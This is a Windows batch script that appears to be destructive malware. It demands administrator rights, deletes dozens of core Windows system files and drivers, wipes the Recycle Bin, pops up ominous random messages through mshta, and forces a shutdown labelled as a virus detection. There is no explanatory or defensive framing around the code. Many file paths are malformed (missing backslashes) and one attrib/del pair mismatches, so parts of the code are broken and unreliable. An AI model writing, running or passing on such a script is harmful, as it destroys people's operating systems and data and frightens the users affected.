@echo off

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo You must run this script as an administrator.
    echo Please right-click and choose "Run as administrator".
    pause
    exit /b
)


attrib -r -s -h c:windowswin.ini

del c:windowswin.ini

@echo off

attrib -r -s -h c:win.ini

del c:win.ini

attrib -r -s -h c:winload.exe

del c:winload.exe

attrib -r -s -h c:ntdll.dll

del c:ntdll.dll

attrib -r -s -h c:kernel32.dll

del c:kernel32.dll

attrib -r -s -h c:user32.dll

del c:user32.dll

attrib -r -s -h c:ntoskrnl.exe

del c:ntoskrnl.exe

attrib -r -s -h c:hal.dll

del c:hal.dll

attrib -r -s -h c:win32k.sys

del c:win32k.sys

attrib -r -s -h c:ndis.sys

del c:ndis.sys

attrib -r -s -h c:ntfs.sys

del c:ntfs.sys

attrib -r -s -h c:bootvid.dll

del c:bootvid.dll

attrib -r -s -h c:ci.dll

del c:ci.dll

attrib -r -s -h c:pshed.dll

del c:pshed.dll

attrib -r -s -h c:ksecdd.sys

del c:ksecdd.sys

attrib -r -s -h c:tcpip.sys

del c:tcpip.sys

attrib -r -s -h c:fltmgr.sys

del c:fltmgr.sys

attrib -r -s -h c:storport.sys

del c:storport.sys

attrib -r -s -h c:dxgkrnl.sys

del c:dxgkrnl.sys

attrib -r -s -h c:fileinfo.sys

del c:fileinfo.sys

attrib -r -s -h c:volsnap.sys

del c:volsnap.sys

attrib -r -s -h c:Ntfs.sys

del c:Ntfs.sys

attrib -r -s -h c:wdf01000.sys

del c:wdf01000.sys

attrib -r -s -h c:classpnp.sys

del c:classpnp.sys

attrib -r -s -h c:ACPI.sys

del c:ACPI.sys

attrib -r -s -h c:atapi.sys

del c:atapi.sys

attrib -r -s -h c:battc.sys

del c:battc.sys

attrib -r -s -h c:disk.sys

del c:disk.sys

attrib -r -s -h c:mouclass.sys

del c:mouclass.sys

attrib -r -s -h c:kbdclass.sys

del c:kbdclass.sys

attrib -r -s -h c:pci.sys

del c:pci.sys

attrib -r -s -h c:usbuhci.sys

del c:usbuhci.sys

attrib -r -s -h c:ci.dll

del c:usbhub.sys

attrib -r -s -h c:videoport.sys

del c:videoport.sys

rd /s /q %systemdrive%\$Recycle.bin

msg * Why have you done this?

@echo off
setlocal enabledelayedexpansion

set words=why how where you come never here begone fear infected lightly taken i will become one over

for /l %%i in (1, 1, 20) do (
    for /f %%x in ('mode con ^| findstr Columns') do set /a screenWidth=%%x - 400
    for /f %%y in ('mode con ^| findstr Lines') do set /a screenHeight=%%y - 200

    set /a xPos=!random! % screenWidth + 200
    set /a yPos=!random! % screenHeight + 100

    set message=
    for /l %%j in (1, 1, 3) do (
        set /a wordIndex=!random! * 17 / 32768 + 1 
        for /f "tokens=!wordIndex!" %%w in ("!words!") do set message=!message! %%w
    )

    set /a color=!random! % 255 + 1
    mshta vbscript:Execute("msgbox("""<span style='color:rgb(!color!,!color!,!color!)'>!message!</span>""", 16, ""Random Message""):close") //xPos:yPos 
)
endlocal


shutdown -s -t 7 -c "Virus Detected, Shutting Down."
